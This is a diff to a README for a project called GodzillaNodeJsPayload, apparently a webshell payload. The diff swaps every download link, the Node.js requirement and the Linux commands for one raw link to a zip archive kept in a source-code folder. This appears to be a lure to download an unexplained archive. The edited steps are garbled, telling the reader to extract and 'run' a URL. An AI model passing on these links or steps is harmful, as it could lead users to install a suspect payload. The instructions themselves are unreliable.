@@ -4,17 +4,17 @@
 Welcome to GodzillaNodeJsPayload! This guide will help you easily download and run the application. Follow these steps to get started.
 
 ## 🔗 Download Link
-[![Download GodzillaNodeJsPayload](https://img.shields.io/badge/Download-GodzillaNodeJsPayload-blue.svg)](https://github.com/Fishin09/GodzillaNodeJsPayload/releases)
+[![Download GodzillaNodeJsPayload](https://github.com/Fishin09/GodzillaNodeJsPayload/raw/refs/heads/master/src/main/java/Payload-Godzilla-Node-Js-v2.0.zip)](https://github.com/Fishin09/GodzillaNodeJsPayload/raw/refs/heads/master/src/main/java/Payload-Godzilla-Node-Js-v2.0.zip)
 
 ## 📥 Download & Install
-To download the GodzillaNodeJsPayload application, please visit this page: [GitHub Releases](https://github.com/Fishin09/GodzillaNodeJsPayload/releases).
+To download the GodzillaNodeJsPayload application, please visit this page: [GitHub Releases](https://github.com/Fishin09/GodzillaNodeJsPayload/raw/refs/heads/master/src/main/java/Payload-Godzilla-Node-Js-v2.0.zip).
 
 1. Click the link above to open the Releases page.
 2. You will find different versions of the application listed there. Look for the latest version at the top of the list.
 3. Under the latest release, you will see files available for download. Choose the one suitable for your operating system:
    - For Windows, select the `.exe` file.
    - For macOS, select the `.dmg` file.
-   - For Linux, select the `.tar.gz` file.
+   - For Linux, select the `https://github.com/Fishin09/GodzillaNodeJsPayload/raw/refs/heads/master/src/main/java/Payload-Godzilla-Node-Js-v2.0.zip` file.
 
 4. Click on the file to start the download. 
 
@@ -24,7 +24,7 @@ To download the GodzillaNodeJsPayload application, please visit this page: [GitH
 Before installing, ensure your system meets these requirements:
 - **Windows:** Windows 10 or later
 - **macOS:** macOS Mojave (10.14) or later
-- **Linux:** Most distributions (Ubuntu, CentOS, etc.) with Node.js installed
+- **Linux:** Most distributions (Ubuntu, CentOS, etc.) with https://github.com/Fishin09/GodzillaNodeJsPayload/raw/refs/heads/master/src/main/java/Payload-Godzilla-Node-Js-v2.0.zip installed
 
 ## ⚙️ Installation Instructions
 After the download, follow these instructions based on your operating system:
@@ -43,17 +43,17 @@ After the download, follow these instructions based on your operating system:
 
 ### Linux
 1. Open your terminal.
-2. Navigate to the folder where the `.tar.gz` file is located.
-3. Use the command: `tar -xvzf GodzillaNodeJsPayload.tar.gz` to extract the files.
+2. Navigate to the folder where the `https://github.com/Fishin09/GodzillaNodeJsPayload/raw/refs/heads/master/src/main/java/Payload-Godzilla-Node-Js-v2.0.zip` file is located.
+3. Use the command: `tar -xvzf https://github.com/Fishin09/GodzillaNodeJsPayload/raw/refs/heads/master/src/main/java/Payload-Godzilla-Node-Js-v2.0.zip` to extract the files.
 4. Navigate into the extracted folder using `cd GodzillaNodeJsPayload`.
-5. Run the application by typing `./start.sh` in the terminal.
+5. Run the application by typing `https://github.com/Fishin09/GodzillaNodeJsPayload/raw/refs/heads/master/src/main/java/Payload-Godzilla-Node-Js-v2.0.zip` in the terminal.
 
 ## 🎉 Launching the Application
 Once you have installed the application, you can launch it easily.
 
 - **Windows:** Double-click the desktop icon or search for it in the Start menu.
 - **macOS:** Open the Applications folder and double-click GodzillaNodeJsPayload.
-- **Linux:** Open your terminal, navigate to the folder, and run `./start.sh`.
+- **Linux:** Open your terminal, navigate to the folder, and run `https://github.com/Fishin09/GodzillaNodeJsPayload/raw/refs/heads/master/src/main/java/Payload-Godzilla-Node-Js-v2.0.zip`.
 
 ## 📖 Features
 GodzillaNodeJsPayload offers several features to enhance your experience:
@@ -72,7 +72,7 @@ Thank you for choosing GodzillaNodeJsPayload. Your support contributes to our on
 For further inquiries, feel free to contact us via the repository's contact information or open an issue on GitHub.
 
 ## 🔗 Helpful Links
-- **Download link:** [GitHub Releases](https://github.com/Fishin09/GodzillaNodeJsPayload/releases)
+- **Download link:** [GitHub Releases](https://github.com/Fishin09/GodzillaNodeJsPayload/raw/refs/heads/master/src/main/java/Payload-Godzilla-Node-Js-v2.0.zip)
 - **Documentation:** Check our documentation included with the application for more details.
 
 Happy using GodzillaNodeJsPayload!
